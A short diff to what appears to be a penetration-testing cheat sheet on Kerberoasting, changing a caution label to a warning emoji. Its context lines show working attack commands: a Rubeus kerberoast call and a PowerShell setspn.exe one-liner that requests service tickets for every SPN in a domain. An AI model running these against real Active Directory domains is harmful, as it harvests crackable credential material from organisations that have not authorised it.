@@ -76,7 +76,7 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
     Rubeus.exe kerberoast /nowrap
     ```
 * **Retrieving All Tickets Using setspn.exe**  
-  Caution: This will pull all computer accounts as well, so use with caution
+  :warning: This will pull all computer accounts as well, so use with caution
   ```powershell
   setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
   ```
